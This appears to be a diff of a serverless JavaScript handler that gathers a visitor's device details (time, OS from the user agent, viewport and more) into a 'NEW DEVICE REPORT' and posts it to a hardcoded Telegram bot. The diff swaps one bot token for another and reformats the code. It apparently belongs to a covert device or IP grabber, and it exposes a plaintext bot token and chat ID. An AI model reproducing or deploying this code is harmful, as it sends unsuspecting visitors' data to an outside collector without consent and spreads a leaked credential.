@@ -30,9 +30,11 @@ export default async function handler(req, res) {
   const userAgent = req.headers['user-agent'] || '';
   data.os = detectOS(userAgent);
 
-  const date = new Date().toLocaleString('en-US', { timeZone: 'Asia/Manila' });
+  const date = new Date().toLocaleString('en-US', {
+    timeZone: 'Asia/Manila'
+  });
 
-  // Build Telegram message
+  // Telegram message (HTML format)
   const message = `
 <b>📡 NEW DEVICE REPORT</b>
 <b>🕒 Time:</b> ${escapeHTML(date)}
@@ -54,20 +56,28 @@ export default async function handler(req, res) {
 • Viewport: ${escapeHTML(data.viewport || 'Unknown')}
 `;
 
-  const BOT_TOKEN = '8336451826:AAH1617xQAOkNRSGFZndkMLXMrhgrNR2I1E';
+  // 🔑 YOUR TELEGRAM CREDENTIALS
+  const BOT_TOKEN = '8336451826:AAGfx7cszLbH5mNRF84AsD9188krScNaIA8';
   const CHAT_ID = '7843509294';
 
   try {
-    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-      chat_id: CHAT_ID,
-      text: message,
-      parse_mode: 'HTML'
-    });
+    await axios.post(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      }
+    );
 
     console.log('[+] Sent device info to Telegram');
     return res.status(200).json({ success: true });
+
   } catch (err) {
-    console.error('[!] Failed to send to Telegram:', err.response?.data || err.message);
+    console.error(
+      '[!] Failed to send to Telegram:',
+      err.response?.data || err.message
+    );
     return res.status(500).json({ error: 'Failed to send to Telegram' });
   }
 }
